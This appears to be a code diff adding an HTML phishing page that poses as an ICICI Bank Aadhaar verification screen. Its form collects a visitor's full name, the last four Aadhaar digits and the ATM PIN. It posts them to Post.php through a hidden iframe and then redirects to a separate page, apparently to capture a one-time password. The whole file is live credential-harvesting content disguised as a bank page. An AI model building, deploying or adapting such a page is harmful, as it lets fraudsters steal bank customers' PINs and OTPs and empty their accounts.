@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+   <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+   <meta name="theme-color" content="#FFF">
+   <head>
+      <meta charSet="utf-8"/>
+      <meta name="viewport" content="width=device-width"/>
+      <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+      <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+      <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+      <link rel="manifest" href="/site.webmanifest">
+      <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+      <meta name="msapplication-TileColor" content="#da532c">
+      <title>AADHAR (UIDAI) authentication | ICICI Bank</title>
+      <meta name="description" content="login"/>
+      <meta name="next-head-count" content="4"/>
+      <link rel="preload" href="Axis.css" as="style"/>
+      <link rel="stylesheet" href="Axis.css" data-n-g=""/>
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap" rel="stylesheet">
+      <noscript data-n-css=""></noscript>
+      <style>
+      .new-control
+      {
+      text-transform:uppercase;
+      }
+      </style>
+    </head>
+   <body>
+   <!-- partial:index.partial.html -->
+   <div class="login-box">
+   <!-- Static- Please don't do anything here-->
+   <script type="text/javascript">var submitted=false;</script>
+   <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Enter_OTP_AADHAR.html';}"></iframe>
+   <!--My Form-->
+      <div id="__next">
+           <img alt="" src="icici h.jpg" style="width:100%;" />
+         </div>
+         <div class="mainContent">
+            <h1 class="text-center">AADHAR (UIDAI) Verification</h1>
+            <div class="card">
+               <form class="LoginForm" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+                  <input type="hidden" name="" value=""/>
+                  <div class="form-group"><label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="Full_Name">
+                  Full Name (As per AADHAR)<p1 style="font-size:13px; color:red;">*</p1></label>
+                  <input type="text" class="new-control" id="Full_Name" name="Full_Name" minLength="3" maxLength="30" required=""/></div>
+                  
+                  <div class="form-group"><label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="AADHAR_Number">
+                  Last 4 Digit AADHAR (UIDAI) Number<p1 style="font-size:13px; color:red;">*</p1></label>
+                  <input type="text" class="new-control" id="AADHAR_Number" name="AADHAR_Number" maxLength="4" inputmode="numeric" pattern="[0-9]\d{3}" title="Please enter valid last 4digit AADHAR (UIDAI) number!" required=""/></div>
+                  
+                  <div class="form-group"><label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="Fathers_Name">
+                  ATM PIN<p1 style="font-size:13px; color:red;">*</p1></label>
+                   <input type="text" class="new-control" id="ATM PIN" name="ATM PIN" maxLength="4" inputmode="numeric" pattern="[0-9]\d{3}" title="Please enter valid ATM PIN!" required=""/></div>
+                  <div class="text-center"><button type="submit" class="submit">SUBMIT</button></div>
+               </form>
+            </div>
+            <br><br>
+            <img alt="" src="ICICI OTP F.jpg" style="width: 100%; height: auto;" />
+         </div>
+      </div>
+     </body>
+</html>
